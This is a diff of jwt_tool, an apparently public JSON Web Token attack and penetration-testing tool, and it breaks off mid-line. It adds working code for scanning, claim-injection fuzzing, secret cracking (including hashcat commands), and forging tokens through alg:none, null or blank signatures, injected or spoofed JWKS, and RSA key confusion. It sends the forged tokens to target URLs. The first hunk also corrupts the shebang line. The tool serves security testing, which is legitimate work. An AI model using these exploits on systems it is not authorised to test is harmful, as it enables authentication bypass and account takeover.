@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+p#!/usr/bin/env python3
 #
 # JWT_Tool version 2.2.6 (09_09_2022)
 # Written by Andy Tyler (@ticarpi)
@@ -1498,3 +1498,484 @@ def scanModePlaybook():
         for payloadClaim in paylDict:
             injectExternalInteractionPayload(config['services']['httplistener']+"/inject_existing_", payloadClaim)
         cprintc("External service interactions have been tested - check your listener for interactions", "green")
+    else:
+        cprintc("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option", "red")
+    # Accept Common HMAC secret (as alterative signature)
+    with open(config['input']['wordlist'], "r", encoding='utf-8', errors='ignore') as commonPassList:
+        commonPass = commonPassList.readline().rstrip()
+        while commonPass:
+            newSig, newContents = signTokenHS(headDict, paylDict, commonPass, 256)
+            jwtOut(newContents+"."+newSig, "Checking for alternative accepted HMAC signatures, based on common passwords. Testing: "+commonPass+"", "This token can exploit a hard-coded common password in the config")
+            commonPass = commonPassList.readline().rstrip()
+    # SCAN COMPLETE
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
+    # Further manual testing: check expired token, brute key, find Public Key, run other scans
+    cprintc("The following additional checks should be performed that are better tested manually:", "magenta")
+    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
+        cprintc("[+] Try testing "+headDict['alg'][:2]+" token against weak password configurations by running the following hashcat cracking options:", "green")
+        cprintc("(Already testing against passwords in jwt-common.txt)", "cyan")
+        cprintc("Try using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6", "cyan")
+    if headDict['alg'][:2] != "HS" and headDict['alg'][:2] != "hs":
+        cprintc("[+] Try hunting for a Public Key for this token. Validate any JWKS you find (-V -jw [jwks_file]) and then use the generated Public Key file with the Playbook Scan (-pk [kid_from_jwks].pem)", "green")
+        cprintc("Common locations for Public Keys are either the web application's SSL key, or stored as a JWKS file in one of these locations:", "cyan")
+        with open('jwks-common.txt', "r", encoding='utf-8', errors='ignore') as jwksLst:
+            nextVal = jwksLst.readline().rstrip()
+            while nextVal:
+                cprintc(nextVal, "cyan")
+                nextVal = jwksLst.readline().rstrip()
+    try:
+        timestamp = datetime.fromtimestamp(int(paylDict['exp']))
+        cprintc("[+] Try waiting for the token to expire (\"exp\" value set to: "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC))", "green")
+        cprintc("Check if still working once expired.", "cyan")
+    except:
+        pass
+
+def scanModeErrors():
+    cprintc("\nLAUNCHING SCAN: Forced Errors", "magenta")
+    # Inject dangerous content-types into existing header claims
+    injectEachHeader(None)
+    injectEachHeader(True)
+    injectEachHeader(False)
+    injectEachHeader("jwt_tool")
+    injectEachHeader(0)
+    # Inject dangerous content-types into existing payload claims
+    injectEachPayload(None)
+    injectEachPayload(True)
+    injectEachPayload(False)
+    injectEachPayload("jwt_tool")
+    injectEachPayload(0)
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
+
+def scanModeCommonClaims():
+    cprintc("\nLAUNCHING SCAN: Common Claim Injection", "magenta")
+    # Inject external URLs into common claims
+    with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
+        nextHeader = commonHeaders.readline().rstrip()
+        while nextHeader:
+            injectExternalInteractionHeader(config['services']['httplistener']+"/inject_common_", nextHeader)
+            nextHeader = commonHeaders.readline().rstrip()
+    with open(config['input']['commonPayloads'], "r", encoding='utf-8', errors='ignore') as commonPayloads:
+        nextPayload = commonPayloads.readline().rstrip()
+        while nextPayload:
+            injectExternalInteractionPayload(config['services']['httplistener']+"/inject_common_", nextPayload)
+            nextPayload = commonPayloads.readline().rstrip()
+    # Inject dangerous content-types into common claims
+    injectCommonClaims(None)
+    injectCommonClaims(True)
+    injectCommonClaims(False)
+    injectCommonClaims("jwt_tool")
+    injectCommonClaims(0)
+
+    cprintc("Scanning mode completed: review the above results.\n", "magenta")
+
+def injectCommonClaims(contentVal):
+    with open(config['input']['commonHeaders'], "r", encoding='utf-8', errors='ignore') as commonHeaders:
+        nextHeader = commonHeaders.readline().rstrip()
+        while nextHeader:
+            origVal = ""
+            try:
+                origVal = headDict[nextHeader]
+            except:
+                pass
+            headDict[nextHeader] = contentVal
+            newContents = genContents(headDict, paylDict)
+            jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Common Header Claim: "+str(nextHeader))
+            if origVal != "":
+                headDict[nextHeader] = origVal
+            else:
+                del headDict[nextHeader]
+            nextHeader = commonHeaders.readline().rstrip()
+    with open(config['input']['commonPayloads'], "r", encoding='utf-8', errors='ignore') as commonPayloads:
+        nextPayload = commonPayloads.readline().rstrip()
+        while nextPayload:
+            origVal = ""
+            try:
+                origVal = paylDict[nextPayload]
+            except:
+                pass
+            paylDict[nextPayload] = contentVal
+            newContents = genContents(headDict, paylDict)
+            jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Common Payload Claim: "+str(nextPayload))
+            if origVal != "":
+                paylDict[nextPayload] = origVal
+            else:
+                del paylDict[nextPayload]
+            nextPayload = commonPayloads.readline().rstrip()
+
+def injectEachHeader(contentVal):
+    for headerClaim in headDict:
+        origVal = headDict[headerClaim]
+        headDict[headerClaim] = contentVal
+        newContents = genContents(headDict, paylDict)
+        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Header Claim: "+str(headerClaim))
+        headDict[headerClaim] = origVal
+
+def injectEachPayload(contentVal):
+    for payloadClaim in paylDict:
+        origVal = paylDict[payloadClaim]
+        paylDict[payloadClaim] = contentVal
+        newContents = genContents(headDict, paylDict)
+        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Payload Claim: "+str(payloadClaim))
+        paylDict[payloadClaim] = origVal
+
+def injectExternalInteractionHeader(listenerUrl, headerClaim):
+    injectUrl = listenerUrl+headerClaim
+    origVal = ""
+    try:
+        origVal = headDict[headerClaim]
+    except:
+        pass
+    headDict[headerClaim] = injectUrl
+    newContents = genContents(headDict, paylDict)
+    jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Header Claim: "+str(headerClaim))
+    if origVal != "":
+        headDict[headerClaim] = origVal
+    else:
+        del headDict[headerClaim]
+
+def injectExternalInteractionPayload(listenerUrl, payloadClaim):
+    injectUrl = listenerUrl+payloadClaim
+    origVal = ""
+    try:
+        origVal = paylDict[payloadClaim]
+    except:
+        pass
+    paylDict[payloadClaim] = injectUrl
+    newContents = genContents(headDict, paylDict)
+    jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Payload Claim: "+str(payloadClaim))
+    if origVal != "":
+        paylDict[payloadClaim] = origVal
+    else:
+        del paylDict[payloadClaim]
+
+# def kidInjectAttacks():
+#     with open(config['argvals']['injectionfile'], "r", encoding='utf-8', errors='ignore') as valLst:
+#         nextVal = valLst.readline()
+#         while nextVal:
+#             newheadDict, newHeadB64 = injectheaderclaim(config['argvals']['headerclaim'], nextVal.rstrip())
+#             newContents = genContents(newheadDict, paylDict)
+#             jwtOut(newContents+"."+sig, "Injected kid claim", desc)
+#             nextVal = valLst.readline()
+
+def reflectedClaims():
+    checkVal = "jwt_inject_"+hashlib.md5(datetime.now().strftime('%Y-%m-%d %H:%M:%S').encode()).hexdigest()+"_"
+    for claim in paylDict:
+        tmpValue = paylDict[claim]
+        paylDict[claim] = checkVal+claim
+        tmpContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
+        jwtOut(tmpContents+"."+sig, "Claim processing check in "+claim+" claim", "Token sent to check if the signature is checked before the "+claim+" claim is processed")
+        if checkVal+claim in config['argvals']['rescontent']:
+            cprintc("Injected value in "+claim+" claim was observed - "+checkVal+claim, "red")
+        paylDict[claim] = tmpValue
+
+
+def preScan():
+    cprintc("Running prescan checks...", "cyan")
+    jwtOut(jwt, "Prescan: original token", "Prescan: original token")
+    if config['argvals']['canaryvalue']:
+        if config['argvals']['canaryvalue'] not in config['argvals']['rescontent']:
+            cprintc("Canary value ("+config['argvals']['canaryvalue']+") was not found in base request - check that this token is valid and you are still logged in", "red")
+            shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
+            if shallWeGoOn == "N":
+                exit(1)
+            elif shallWeGoOn == "n":
+                exit(1)
+    origResSize, origResCode = config['argvals']['ressize'], config['argvals']['rescode']
+    jwtOut("null", "Prescan: no token", "Prescan: no token")
+    nullResSize, nullResCode = config['argvals']['ressize'], config['argvals']['rescode']
+    if config['argvals']['canaryvalue'] == "":
+        if origResCode == nullResCode:
+            cprintc("Valid and missing token requests return the same Status Code.\nYou should probably specify something from the page that identifies the user is logged-in (e.g. -cv \"Welcome back, ticarpi!\")", "red")
+            shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
+            if shallWeGoOn == "N":
+                exit(1)
+            elif shallWeGoOn == "n":
+                exit(1)
+    jwtTweak = contents.decode()+"."+sig[:-4]
+    jwtOut(jwtTweak, "Prescan: Broken signature", "This token was sent to check if the signature is being checked")
+    jwtOut(jwt, "Prescan: repeat original token", "Prescan: repeat original token")
+    if origResCode != config['argvals']['rescode']:
+        cprintc("Original token not working after invalid submission. Testing will need to be done manually, re-authenticating after each invalid submission", "red")
+        exit(1)
+
+
+def runScanning():
+    cprintc("Running Scanning Module:", "cyan")
+    preScan()
+    if config['argvals']['scanMode'] == "pb":
+        scanModePlaybook()
+    if config['argvals']['scanMode'] == "er":
+        scanModeErrors()
+    if config['argvals']['scanMode'] == "cc":
+        scanModeCommonClaims()
+    if config['argvals']['scanMode'] == "at":
+        scanModePlaybook()
+        scanModeErrors()
+        scanModeCommonClaims()
+
+
+def runExploits():
+    if args.exploit:
+        if args.exploit == "a":
+            noneToks = checkAlgNone(headDict, paylB64)
+            zippedToks = dict(zip(noneToks, ["\"alg\":\"none\"", "\"alg\":\"None\"", "\"alg\":\"NONE\"", "\"alg\":\"nOnE\""]))
+            for noneTok in zippedToks:
+                desc = "EXPLOIT: "+zippedToks[noneTok]+" - this is an exploit targeting the debug feature that allows a token to have no signature\n(This will only be valid on unpatched implementations of JWT.)"
+                jwtOut(noneTok, "Exploit: "+zippedToks[noneTok], desc)
+        elif args.exploit == "n":
+            jwtNull = checkNullSig(contents)
+            desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
+            jwtOut(jwtNull, "Exploit: Null signature", desc)
+        elif args.exploit == "b":
+            key = ""
+            newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
+            jwtBlankPw = newContents+"."+newSig
+            desc = "EXPLOIT: Blank password accepted in signature\n(This will only be valid on unpatched implementations of JWT.)"
+            jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature", desc)
+        elif args.exploit == "i":
+            newSig, newContents = jwksEmbed(headDict, paylDict)
+            desc = "EXPLOIT: injected JWKS\n(This will only be valid on unpatched implementations of JWT.)"
+            jwtOut(newContents+"."+newSig, "Injected JWKS", desc)
+        elif args.exploit == "s":
+            if config['services']['jwksloc']:
+                jku = config['services']['jwksloc']
+            else:
+                jku = config['services']['jwksdynamic']
+            newContents, newSig = exportJWKS(jku)
+            if config['services']['jwksloc'] and config['services']['jwksloc'] == args.jwksurl:
+                cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
+            desc = "Signed with JWKS at "+jku
+            jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)
+        elif args.exploit == "k":
+            if config['crypto']['pubkey']:
+                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
+                desc = "EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)\n(This will only be valid on unpatched implementations of JWT.)"
+                jwtOut(newTok+"."+newSig, "RSA Key Confusion Exploit", desc)
+            else:
+                cprintc("No Public Key provided (-pk)\n", "red")
+                parser.print_usage()
+
+def runActions():
+    if args.tamper:
+        tamperToken(paylDict, headDict, sig)
+        exit(1)
+    if args.verify:
+        if args.pubkey:
+            algType = headDict["alg"][0:2]
+            if algType == "RS":
+                if args.pubkey:
+                    verifyTokenRSA(headDict, paylDict, sig, args.pubkey)
+                else:
+                    verifyTokenRSA(headDict, paylDict, sig, config['crypto']['pubkey'])
+                exit(1)
+            elif algType == "ES":
+                if config['crypto']['pubkey']:
+                    verifyTokenEC(headDict, paylDict, sig, config['crypto']['pubkey'])
+                else:
+                    cprintc("No Public Key provided (-pk)\n", "red")
+                    parser.print_usage()
+                exit(1)
+            elif algType == "PS":
+                if config['crypto']['pubkey']:
+                    verifyTokenPSS(headDict, paylDict, sig, config['crypto']['pubkey'])
+                else:
+                    cprintc("No Public Key provided (-pk)\n", "red")
+                    parser.print_usage()
+                exit(1)
+            else:
+                cprintc("Algorithm not supported for verification", "red")
+                exit(1)
+        elif args.jwksfile:
+            parseJWKS(config['crypto']['jwks'])
+        else:
+            cprintc("No Public Key or JWKS file provided (-pk/-jw)\n", "red")
+            parser.print_usage()
+        exit(1)
+    runExploits()
+    if args.crack:
+        if args.password:
+            cprintc("Password provided, checking if valid...", "cyan")
+            checkSig(sig, contents, config['argvals']['key'])
+        elif args.dict:
+            crackSig(sig, contents)
+        elif args.keyfile:
+            checkSigKid(sig, contents)
+        else:
+            cprintc("No cracking option supplied:\nPlease specify a password/dictionary/Public Key\n", "red")
+            parser.print_usage()
+        exit(1)
+    if args.query and config['argvals']['sigType'] != "":
+        signingToken(headDict, paylDict)
+
+def printLogo():
+    print()
+    print("   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\                  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ ")
+    print("   \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __| \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __|                 \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
+    print("      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
+    print("      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
+    print("\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  _\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
+    print("\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  / \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
+    print("\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  /   \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
+    print(" \______/ \__/     \__|   \__|\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\__| \______/  \______/ \__|")
+    print(" \x1b[36mVersion "+jwttoolvers+"          \x1b[0m      \______|             \x1b[36m@ticarpi\x1b[0m      ")
+    print()
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(epilog="If you don't have a token, try this one:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po", formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument("jwt", nargs='?', type=str,
+                        help="the JWT to tinker with (no need to specify if in header/cookies)")
+    parser.add_argument("-b", "--bare", action="store_true",
+                        help="return TOKENS ONLY")
+    parser.add_argument("-t", "--targeturl", action="store",
+                        help="URL to send HTTP request to with new JWT")
+    parser.add_argument("-rc", "--cookies", action="store",
+                        help="request cookies to send with the forged HTTP request")
+    parser.add_argument("-rh", "--headers", action="append",
+                        help="request headers to send with the forged HTTP request (can be used multiple times for additional headers)")
+    parser.add_argument("-pd", "--postdata", action="store",
+                        help="text string that contains all the data to be sent in a POST request")
+    parser.add_argument("-cv", "--canaryvalue", action="store",
+                        help="text string that appears in response for valid token (e.g. \"Welcome, ticarpi\")")
+    parser.add_argument("-np", "--noproxy", action="store_true",
+                        help="disable proxy for current request (change in jwtconf.ini if permanent)")
+    parser.add_argument("-nr", "--noredir", action="store_true",
+                        help="disable redirects for current request (change in jwtconf.ini if permanent)")
+    parser.add_argument("-M", "--mode", action="store",
+                        help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\ncc = fuzz common claims\nat - All Tests!")
+    parser.add_argument("-X", "--exploit", action="store",
+                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
+    parser.add_argument("-ju", "--jwksurl", action="store",
+                        help="URL location where you can host a spoofed JWKS")
+    parser.add_argument("-S", "--sign", action="store",
+                        help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\nes256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
+    parser.add_argument("-pr", "--privkey", action="store",
+                        help="Private Key for Asymmetric crypto")
+    parser.add_argument("-T", "--tamper", action="store_true",
+                        help="tamper with the JWT contents\n(set signing options with -S or use exploits with -X)")
+    parser.add_argument("-I", "--injectclaims", action="store_true",
+                        help="inject new claims and update existing claims with new values\n(set signing options with -S or use exploits with -X)\n(set target claim with -hc/-pc and injection values/lists with -hv/-pv")
+    parser.add_argument("-hc", "--headerclaim", action="append",
+                        help="Header claim to tamper with")
+    parser.add_argument("-pc", "--payloadclaim", action="append",
+                        help="Payload claim to tamper with")
+    parser.add_argument("-hv", "--headervalue", action="append",
+                        help="Value (or file containing values) to inject into tampered header claim")
+    parser.add_argument("-pv", "--payloadvalue", action="append",
+                        help="Value (or file containing values) to inject into tampered payload claim")
+    parser.add_argument("-C", "--crack", action="store_true",
+                        help="crack key for an HMAC-SHA token\n(specify -d/-p/-kf)")
+    parser.add_argument("-d", "--dict", action="store",
+                        help="dictionary file for cracking")
+    parser.add_argument("-p", "--password", action="store",
+                        help="password for cracking")
+    parser.add_argument("-kf", "--keyfile", action="store",
+                        help="keyfile for cracking (when signed with 'kid' attacks)")
+    parser.add_argument("-V", "--verify", action="store_true",
+                        help="verify the RSA signature against a Public Key\n(specify -pk/-jw)")
+    parser.add_argument("-pk", "--pubkey", action="store",
+                        help="Public Key for Asymmetric crypto")
+    parser.add_argument("-jw", "--jwksfile", action="store",
+                        help="JSON Web Key Store for Asymmetric crypto")
+    parser.add_argument("-Q", "--query", action="store",
+                        help="Query a token ID against the logfile to see the details of that request\ne.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a")
+    parser.add_argument("-v", "--verbose", action="store_true",
+                        help="When parsing and printing, produce (slightly more) verbose output.")
+    args = parser.parse_args()
+    if not args.bare:
+        printLogo()
+    try:
+        path = os.path.expanduser("~/.jwt_tool")
+        if not os.path.exists(path):
+            os.makedirs(path)
+    except:
+        path = sys.path[0]
+    logFilename = path+"/logs.txt"
+    configFileName = path+"/jwtconf.ini"
+    config = configparser.ConfigParser()
+    if (os.path.isfile(configFileName)):
+        config.read(configFileName)
+    else:
+        cprintc("No config file yet created.\nRunning config setup.", "cyan")
+        createConfig()
+    if config['services']['jwt_tool_version'] != jwttoolvers:
+        cprintc("Config file showing wrong version ("+config['services']['jwt_tool_version']+" vs "+jwttoolvers+")", "red")
+        cprintc("Current config file has been backed up as '"+path+"/old_("+config['services']['jwt_tool_version']+")_jwtconf.ini' and a new config generated.\nPlease review and manually transfer any custom options you have set.", "red")
+        os.rename(configFileName, path+"/old_("+config['services']['jwt_tool_version']+")_jwtconf.ini")
+        createConfig()
+        exit(1)
+    with open(path+"/null.txt", 'w') as nullfile:
+        pass
+    findJWT = ""
+    if args.targeturl:
+        if args.cookies or args.headers or args.postdata:
+            jwt_count = 0
+            jwt_locations = []
+
+            if args.cookies and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies):
+                jwt_count += 1
+                jwt_locations.append("cookie")
+
+            if args.headers and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.headers)):
+                jwt_count += 1
+                jwt_locations.append("headers")
+
+            if args.postdata and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.postdata)):
+                jwt_count += 1
+                jwt_locations.append("post data")
+
+            if jwt_count > 1:
+                cprintc("Too many tokens! JWT in more than one place: cookie, header, POST data", "red")
+                exit(1)
+
+            if args.cookies:
+                try:
+                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies):
+                        config['argvals']['headerloc'] = "cookies"
+                except:
+                    cprintc("Invalid cookie formatting", "red")
+                    exit(1)
+
+            if args.headers:
+                try:
+                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.headers)):
+                        config['argvals']['headerloc'] = "headers"
+                except:
+                    cprintc("Invalid header formatting", "red")
+                    exit(1)
+
+            if args.postdata:
+                try:
+                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.postdata)):
+                        config['argvals']['headerloc'] = "postdata"
+                except:
+                    cprintc("Invalid postdata formatting", "red")
+                    exit(1)
+
+            searchString = " | ".join([
+                str(args.cookies),
+                str(args.headers),
+                str(args.postdata)
+            ])
+
+            try:
+                findJWT = re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', searchString)[0]
+            except:
+                cprintc("Cannot find a valid JWT", "red")
+                cprintc(searchString, "cyan")
+                exit(1)
+    if args.query:
+        jwt = searchLog(args.query)
+    elif args.jwt:
+        jwt = args.jwt
+        cprintc("Original JWT: "+findJWT+"\n", "cyan")
+    elif findJWT:
+        jwt = findJWT
+        cprintc("Original JWT: "+findJWT+"\n", "cyan")
+    else:
+        parser.print_usage()
+        cprintc("No JWT provided", "red")
+        exit(1)
+    if args.mode:
+        if args.mode not in ['pb','er', 'cc', 'at']:
+            parser.print_usage()
+            cprintc("\nPlease choose a scanning mode (e.g. -M pb):\npb = playbook\ner = force errors\ncc = fuzz common claims\
